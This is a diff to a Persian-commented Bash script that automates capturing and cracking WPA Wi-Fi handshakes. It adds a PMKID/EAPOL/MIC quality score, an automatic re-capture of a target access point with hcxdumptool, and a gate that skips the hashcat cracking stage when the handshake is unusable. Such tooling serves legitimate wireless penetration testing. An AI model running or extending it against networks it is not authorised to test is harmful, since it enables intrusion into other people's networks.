@@ -45,6 +45,30 @@ warn(){ printf '%s[!]%s %s\n' "$_warn" "$_rst" "$*"; }
 err(){ printf '%s[-]%s %s\n' "$_err" "$_rst" "$*"; }
 hr(){ printf '%s%s%s\n' "$_hr" "────────────────────────────────────────────" "$_rst"; }
 
+handshake_quality() {
+  # محاسبهٔ امتیاز (0-3): PMKID، EAPOL 4-way، MIC معتبر
+  HS_SCORE=0
+  HS_OK=0
+  local mic_ok=1
+  if [ -f "${WORK:-}/hcxtool.log" ]; then
+    if grep -qiE 'invalid|error|bad[[:space:]]*mic|wrong[[:space:]]*mic|mic[[:space:]]*fail' "${WORK}/hcxtool.log" 2>/dev/null; then
+      mic_ok=0
+    fi
+  fi
+  [ "${PMKID_N:-0}" -gt 0 ] && HS_SCORE=$((HS_SCORE + 1))
+  [ "${EAPOL_N:-0}" -ge 2 ] && HS_SCORE=$((HS_SCORE + 1))
+  [ "$mic_ok" -eq 1 ] && [ "$HS_SCORE" -gt 0 ] && HS_SCORE=$((HS_SCORE + 1))
+  if [ "${PMKID_N:-0}" -gt 0 ]; then
+    HS_OK=1
+  elif [ "${EAPOL_N:-0}" -ge 2 ] && [ "$mic_ok" -eq 1 ]; then
+    HS_OK=1
+  else
+    HS_OK=0
+  fi
+  [ "$mic_ok" -eq 0 ] && HS_OK=0
+}
+
+
 while [ $# -gt 0 ]; do
   case "$1" in
     -p) PROFILE="$2"; shift 2;;
@@ -170,6 +194,7 @@ PLAN
 [2] Extract & normalize
     hcxpcapngtool -o $WORK/raw.hc22000 -E $WORK/essids.txt --eapmschapv2=$WORK/mschapv2.txt $CAP
     hcxhashtool -i $WORK/raw.hc22000 -o $HASH --essid-group
+    Handshake quality scoring (PMKID / 4-way EAPOL / MIC) — re-capture if incomplete
 
 [3] Crack (hashcat layers 0-8)
     0: cowpatty -r $CAP -f <wordlist> -s <essid>
@@ -377,9 +402,57 @@ fi
   save_checkpoint 3
 fi
 
+# ---------- ارزیابی کیفیت handshake ----------
+
+# بازمحاسبهٔ شمارنده‌ها در صورت resume
+if [ "${PMKID_N:-0}" -eq 0 ] && [ -s "${HASH:-}" ]; then
+  PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
+  EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
+  PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}
+fi
+
+handshake_quality
+c "کیفیت handshake: $HS_SCORE/3 (PMKID=${PMKID_N:-0}, EAPOL=${EAPOL_N:-0})"
+
+# در صورت ناقص بودن، یک بار re-capture انجام بده
+CRACK_ENABLED=1
+if [ "$HS_OK" -ne 1 ]; then
+  warn "handshake ناقص است؛ تلاش برای re-capture..."
+  # re-run capture core
+  if [ -n "${MON:-}" ]; then
+    HDR=$(hcxdumptool --help 2>&1 || true)
+    if grep -q -- '--filterlist_ap' <<<"$HDR"; then
+      if grep -qE '^\s*-w[, ]' <<<"$HDR"; then OUTFLAG=-w; else OUTFLAG=-o; fi
+      FILTER=()
+      [ -n "${TARGET:-}" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
+      rm -f "$CAP" 2>/dev/null
+      hcxdumptool -i "$MON" "$OUTFLAG" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
+      HK_PID=$!
+      sleep 10
+      kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
+    fi
+  fi
+  if [ -s "$CAP" ]; then
+    hcxpcapngtool -o "$WORK/raw.hc22000" -E "$WORK/essids.txt" \
+      --eapmschapv2="$WORK/mschapv2.txt" "$CAP" > "$WORK/hcxtool.log" 2>&1
+    hcxhashtool -i "$WORK/raw.hc22000" -o "$HASH" --essid-group >/dev/null 2>&1 \
+      || cp "$WORK/raw.hc22000" "$HASH" 2>/dev/null
+    PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
+    EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
+    PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}
+    handshake_quality
+    c "کیفیت handshake پس از re-capture: $HS_SCORE/3"
+  fi
+  if [ "$HS_OK" -ne 1 ]; then
+    warn "handshake همچنان ناقص است؛ cracking رد می‌شود."
+    CRACK_ENABLED=0
+  fi
+fi
+
 # ---------- فاز ۳: موتور کرک ----------
-if [ "$SKIP_TO" -le 4 ]; then
+if [ "$SKIP_TO" -le 4 ] && [ "${CRACK_ENABLED:-1}" -eq 1 ]; then
 hr; c "فاز ۳ — موتور کرک مرحله‌ای"
+
 
 build_dicts(){
   D="$WORK/dicts"; mkdir -p "$D"
